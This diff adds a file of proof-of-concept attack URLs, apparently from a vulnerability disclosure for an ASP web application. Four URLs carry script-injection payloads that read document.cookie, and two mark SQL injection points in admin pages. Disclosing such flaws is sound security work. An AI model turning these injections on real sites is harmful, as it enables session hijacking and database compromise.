@@ -1,0 +1,11 @@
+http://www.example.com/languageselect.asp?lang_URL=Default.asp%3Flang%3D&ss=x%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&img=1
+
+http://www.example.com/languageselect.asp?lang_URL=Default.asp%27};alert%28document.cookie%29;{a=%27%3Flang%3D&ss=x&img=1
+
+http://www.example.com/path_to_admin/menuCodeAE.asp?m=edit&i=185%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/path_to_admin/faqAE.asp?m=edit&i=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/path_to_admin/contentAE.asp?m=edit&i=376+ANY_SQL_HERE
+
+http://www.example.com/path_to_admin/templatesAE.asp?m=edit&i=1+ANY_SQL_HERE
